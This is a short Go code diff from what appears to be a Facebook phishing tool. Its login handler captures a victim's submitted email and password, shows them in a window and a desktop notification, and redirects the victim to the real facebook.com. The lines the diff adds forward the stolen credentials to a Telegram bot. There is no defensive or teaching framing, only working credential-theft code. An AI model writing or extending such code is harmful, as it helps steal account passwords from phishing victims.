@@ -40,6 +40,9 @@ func serveFacebookLogin(win fyne.Window, textGrid *widget.TextGrid, textStream *
 			return
 		}
 		*textStream += "Email = " + email + "\nPass = " + pass + "\n"
+		if useTelegramBot {
+			tg.send("Email = " + email + "\nPass = " + pass)
+		}
 		notiApp.SendNotification(fyne.NewNotification("New Form", email+" : "+pass))
 		textGrid.SetText(*textStream)
 		http.Redirect(response, request, "https://facebook.com", 301)
